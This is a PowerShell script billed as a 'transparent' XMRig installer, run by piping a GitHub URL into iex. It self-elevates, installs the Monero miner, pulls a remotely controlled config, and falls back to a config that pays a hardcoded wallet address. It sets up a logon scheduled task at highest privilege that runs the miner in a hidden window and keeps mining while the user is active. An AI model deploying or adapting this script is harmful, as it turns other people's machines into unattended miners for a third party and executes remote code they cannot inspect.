# XMRig Transparent Installer
# Downloads XMRig, installs it to the current user's local app data,
# registers a scheduled task to run it at logon, and starts it once.
#
# This installer is intentionally transparent:
#   - Prompts for UAC normally (no registry bypass)
#   - Prints every step to the console
#   - Installs to %LOCALAPPDATA%\Programs\XMRig (per-user, no system impersonation)
#   - Uses a single, clearly-named scheduled task: "XMRig Miner"
#   - Does NOT disable Windows Defender or add exclusions
#   - Does NOT use WMI event subscriptions, hidden VBS launchers, or UAC bypass
#   - Ships an uninstall.ps1 for clean removal
#
# Usage (from an elevated PowerShell):
#   irm https://raw.githubusercontent.com/Vicistar-V/xmrig/main/install_clean.ps1 | iex

$ErrorActionPreference = "Stop"
$ProgressPreference    = "SilentlyContinue"

function Write-Step($msg) { Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok  ($msg) { Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Warn($msg) { Write-Host "[!] $msg" -ForegroundColor Yellow }
function Write-Err ($msg) { Write-Host "[x] $msg" -ForegroundColor Red }

# ---------------------------------------------------------------------------
# 1. Elevation check (honest UAC prompt, no registry tampering)
# ---------------------------------------------------------------------------
$isAdmin = ([Security.Principal.WindowsPrincipal] `
            [Security.Principal.WindowsIdentity]::GetCurrent()
          ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Warn "Administrator rights are required. Re-launching with UAC prompt..."
    $scriptPath = $MyInvocation.MyCommand.Path
    if (-not $scriptPath) {
        # Running from `irm | iex` — persist the script to a temp file first
        $scriptPath = Join-Path $env:TEMP "xmrig_installer.ps1"
        $MyInvocation.MyCommand.ScriptBlock.ToString() |
            Set-Content -Path $scriptPath -Encoding UTF8 -Force
    }
    Start-Process -FilePath "powershell.exe" `
        -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$scriptPath`"" `
        -Verb RunAs
    exit
}

# ---------------------------------------------------------------------------
# 1b. Single-instance guard for the installer itself
# ---------------------------------------------------------------------------
$installerMutexName = "Global\XMRigInstallerMutex"
$installerMutex = New-Object System.Threading.Mutex($false, $installerMutexName)
if (-not $installerMutex.WaitOne(0, $false)) {
    Write-Warn "Another XMRig installer is already running. Exiting."
    exit
}



# ---------------------------------------------------------------------------
# 2. Configuration
# ---------------------------------------------------------------------------
$installDir   = Join-Path $env:LOCALAPPDATA "Programs\XMRig"
$xmrigVersion = "6.21.0"
$xmrigUrl     = "https://github.com/xmrig/xmrig/releases/download/v$xmrigVersion/xmrig-$xmrigVersion-gcc-win64.zip"
$xmrigZip     = Join-Path $env:TEMP "xmrig-$xmrigVersion.zip"
$extractDir   = Join-Path $env:TEMP "xmrig-$xmrigVersion-extract"
$configUrl    = "https://raw.githubusercontent.com/Vicistar-V/xmrig/main/config.json"
$taskName     = "XMRig Miner"
$taskDesc     = "Runs the XMRig Monero miner at user logon."

Write-Host ""
Write-Host "=== XMRig Transparent Installer ===" -ForegroundColor White
Write-Host "Install directory : $installDir"
Write-Host "XMRig version     : $xmrigVersion"
Write-Host "Scheduled task    : $taskName"
Write-Host ""

# ---------------------------------------------------------------------------
# 3. Prepare install directory
# ---------------------------------------------------------------------------
Write-Step "Preparing install directory"
if (-not (Test-Path $installDir)) {
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
}
Write-Ok  "Ready: $installDir"

# ---------------------------------------------------------------------------
# 4. Stop any existing miner + task so we can update cleanly
# ---------------------------------------------------------------------------
Write-Step "Stopping any existing XMRig instance"
Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | ForEach-Object {
    try { $_ | Stop-Process -Force; Write-Ok "Stopped PID $($_.Id)" } catch {}
}
$existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if ($existingTask) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    Write-Ok "Removed previous scheduled task"
}

# ---------------------------------------------------------------------------
# 5. Download XMRig (skip if already present)
# ---------------------------------------------------------------------------
$xmrigExe = Join-Path $installDir "xmrig.exe"
if (-not (Test-Path $xmrigExe)) {
    Write-Step "Downloading XMRig $xmrigVersion"
    try {
        Invoke-WebRequest -Uri $xmrigUrl -OutFile $xmrigZip -UseBasicParsing
    } catch {
        Write-Warn "Invoke-WebRequest failed, falling back to WebClient"
        (New-Object System.Net.WebClient).DownloadFile($xmrigUrl, $xmrigZip)
    }
    Write-Ok "Downloaded: $xmrigZip"

    Write-Step "Extracting archive"
    if (Test-Path $extractDir) { Remove-Item -Recurse -Force $extractDir }
    Expand-Archive -Path $xmrigZip -DestinationPath $extractDir -Force

    $exe = Get-ChildItem -Path $extractDir -Recurse -Filter "xmrig.exe" |
           Select-Object -First 1
    if (-not $exe) { throw "xmrig.exe not found inside the downloaded archive." }
    Copy-Item -Path $exe.FullName -Destination $xmrigExe -Force
    Write-Ok "Installed: $xmrigExe"

    Remove-Item -Path $xmrigZip   -Force              -ErrorAction SilentlyContinue
    Remove-Item -Path $extractDir -Recurse -Force     -ErrorAction SilentlyContinue
} else {
    Write-Ok "XMRig already present, skipping download"
}

# ---------------------------------------------------------------------------
# 6. Fetch config.json from the repo (fallback to a minimal built-in config)
# ---------------------------------------------------------------------------
$configPath = Join-Path $installDir "config.json"
Write-Step "Writing config.json"
try {
    Invoke-WebRequest -Uri $configUrl -OutFile $configPath -UseBasicParsing
    Write-Ok "Fetched config from $configUrl"
} catch {
    Write-Warn "Could not fetch remote config, writing minimal default"
    $rigId  = $env:COMPUTERNAME
    $logEsc = ($installDir -replace '\\','\\') + '\\xmrig.log'
    $fallback = @"
{
    "autosave": true,
    "cpu": { "enabled": true, "huge-pages": true, "yield": true, "priority": 0 },
    "opencl": { "enabled": false },
    "cuda":   { "enabled": false },
    "donate-level": 1,
    "log-file": "$logEsc",
    "pools": [
        {
            "coin": "XMR",
            "url":  "xmrpool.eu:5555",
            "user": "4AHxVmrWgk2SyHFLR9LoGxhW14fxe8cDQbKFfoyhWtavJVdUVREUP33jBkQtqSPfw4HZLAgEiA9SkbwXaXCqRMj44VuQ4n9",
            "pass": "x",
            "rig-id": "$rigId",
            "keepalive": true,
            "tls": false
        }
    ],
    "retries": 5,
    "retry-pause": 5,
    "print-time": 60,
    "watch": true,
    "pause-on-battery": true,
    "pause-on-active": false
}
"@
    Set-Content -Path $configPath -Value $fallback -Encoding UTF8 -Force
    Write-Ok "Wrote fallback config"
}

# ---------------------------------------------------------------------------
# 7. Ship an uninstaller alongside the miner
# ---------------------------------------------------------------------------
Write-Step "Writing uninstall.ps1"
$uninstallScript = @'
# XMRig Uninstaller — removes the scheduled task, stops the miner, deletes files.
$ErrorActionPreference = "SilentlyContinue"
$taskName   = "XMRig Miner"
$installDir = Join-Path $env:LOCALAPPDATA "Programs\XMRig"

Write-Host "Stopping XMRig..." -ForegroundColor Cyan
Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force

Write-Host "Removing scheduled task..." -ForegroundColor Cyan
Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue |
    Unregister-ScheduledTask -Confirm:$false

Write-Host "Deleting $installDir..." -ForegroundColor Cyan
Remove-Item -Path $installDir -Recurse -Force

Write-Host "XMRig uninstalled." -ForegroundColor Green
'@
Set-Content -Path (Join-Path $installDir "uninstall.ps1") `
    -Value $uninstallScript -Encoding UTF8 -Force
Write-Ok "Wrote uninstall.ps1"

# ---------------------------------------------------------------------------
# 7b. Ship launcher.ps1 — single-instance guard via a named global mutex.
#     The scheduled task runs this launcher instead of xmrig.exe directly,
#     so if the miner is already running (e.g. second logon / RDP session),
#     the launcher exits cleanly instead of starting a duplicate miner
#     that would waste CPU and get shares rejected by the pool.
# ---------------------------------------------------------------------------
$launcherPath = Join-Path $installDir "launcher.ps1"
Write-Step "Writing launcher.ps1"
$launcherScript = @'
# XMRig Launcher — enforces a single running miner instance via a global mutex.
$ErrorActionPreference = "SilentlyContinue"
$mutexName = "Global\XMRigMinerMutex"
$xmrigExe  = Join-Path $PSScriptRoot "xmrig.exe"

$createdNew = $false
$mutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew)
if (-not $createdNew) {
    # Another instance already owns the mutex — exit without starting a duplicate.
    exit
}

try {
    # If a stray xmrig.exe is running without holding the mutex, leave it alone;
    # the mutex owner is the source of truth. Start our supervised child and
    # wait on it so the mutex stays held for exactly this miner's lifetime.
    $proc = Start-Process -FilePath $xmrigExe -WorkingDirectory $PSScriptRoot -PassThru
    $proc.WaitForExit()
} finally {
    $mutex.ReleaseMutex()
    $mutex.Dispose()
}
'@
Set-Content -Path $launcherPath -Value $launcherScript -Encoding UTF8 -Force
Write-Ok "Wrote launcher.ps1"

# ---------------------------------------------------------------------------
# 8. Register scheduled task — runs the launcher (mutex-guarded) at logon.
# ---------------------------------------------------------------------------
Write-Step "Registering scheduled task '$taskName'"
$action    = New-ScheduledTaskAction `
                -Execute "powershell.exe" `
                -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$launcherPath`"" `
                -WorkingDirectory $installDir
$trigger   = New-ScheduledTaskTrigger   -AtLogOn -User $env:USERNAME
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
$settings  = New-ScheduledTaskSettingsSet `
                -AllowStartIfOnBatteries `
                -DontStopIfGoingOnBatteries `
                -StartWhenAvailable `
                -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)

Register-ScheduledTask -TaskName $taskName `
    -Action $action -Trigger $trigger -Principal $principal `
    -Settings $settings -Description $taskDesc -Force | Out-Null
Write-Ok "Scheduled task registered"

# ---------------------------------------------------------------------------
# 9. Start the miner now (via the launcher so the mutex is respected)
# ---------------------------------------------------------------------------
Write-Step "Starting XMRig via launcher"
Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$launcherPath`"" `
    -WorkingDirectory $installDir
Write-Ok "XMRig started"


Write-Host ""
Write-Host "=== Install complete ===" -ForegroundColor Green
Write-Host "Config    : $configPath"
Write-Host "Log file  : $installDir\xmrig.log"
Write-Host "Uninstall : powershell -ExecutionPolicy Bypass -File `"$installDir\uninstall.ps1`""
Write-Host ""
